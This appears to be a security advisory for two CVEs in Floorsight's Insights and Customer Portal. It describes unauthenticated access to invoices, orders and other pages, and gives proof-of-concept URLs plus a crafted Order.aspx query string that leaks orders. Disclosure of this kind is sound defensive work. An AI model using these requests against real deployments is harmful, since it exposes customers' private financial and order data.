## CVE-2023-45892

* Name of Product: Insights by Floorsight
* The affected or fixed version(s): Versions from Q3 2023 and below (There are no version numbers)
* The CVE ID for the entry: CVE-2023-45892
* Description: This vulnerability allows a remote attacker to access invoices and orders while unauthenticated. There are no access controls to access these pages.
* Vulnerability Type: Insecure Direct Object Reference

### Proof of Concept
Invoices and Orders are accessible unauthenticated:

* https://insight.victim.com/invoice.aspx?id=1
* https://insight.victim.com/order.aspx?id=1

## CVE-2023-45893

* Name of Product: Customer Portal by Floorsight
* The affected or fixed version(s): Versions from Q3 2023 and below (There are no version numbers)
* The CVE ID for the entry: CVE-2023-45893
* Description: This vulnerability allows a remote attacker to access several sensitive pages while unauthenticated. There are no access controls to access these pages.
* Vulnerability Type: Insecure Direct Object Reference

### Proof of Concept

The following are accessible unauthenticated:

* https://customerportal.victim.com/order.aspx
* https://customerportal.victim.com/ratings.aspx
* https://customerportal.victim.com/invoice.aspx
* https://customerportal.victim.com/passwordrecovery.aspx
* https://customerportal.victim.com/statement.aspx
* https://customerportal.victim.com/order.aspx
* https://customerportal.victim.comm/ratings.aspx
* https://customerportal.victim.com/invoice.aspx
* https://customerportal.victim.com/passwordrecovery.aspx
* https://customerportal.victim.com/statement.aspx

To leak orders, for example, you may need to play with the parameters. replace CITYNAME with the server it's hosted in; if you know. findbycode=false is the the thing allows orders to be leaked here.

`Order.aspx?Id=1&lserver=<CITYNAME>&findbycode=FALSE&pcode=37374&pname=USERNAME`
